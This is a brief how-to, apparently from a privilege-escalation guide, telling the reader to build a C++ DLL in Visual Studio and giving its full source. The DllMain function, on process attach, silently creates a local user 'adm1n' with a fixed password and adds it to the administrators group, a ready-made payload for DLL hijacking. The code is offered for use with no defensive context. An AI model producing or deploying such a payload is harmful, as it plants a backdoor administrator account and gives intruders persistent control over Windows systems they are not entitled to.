
You can create your own dll with visual studio. Just create a dll project for c++ and copy code below. Select release and x64 then build it

	#include "pch.h"
	#include <stdlib.h>

	BOOL APIENTRY DllMain(HMODULE hModule,
		DWORD  ul_reason_for_call,
		LPVOID lpReserved
	)
	{
		switch (ul_reason_for_call)
		{
		case DLL_PROCESS_ATTACH:
			system("cmd.exe /c net user adm1n Password123. /add");
			system("cmd.exe /c net localgroup administrators adm1n /add");
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
		}
		return TRUE;
	}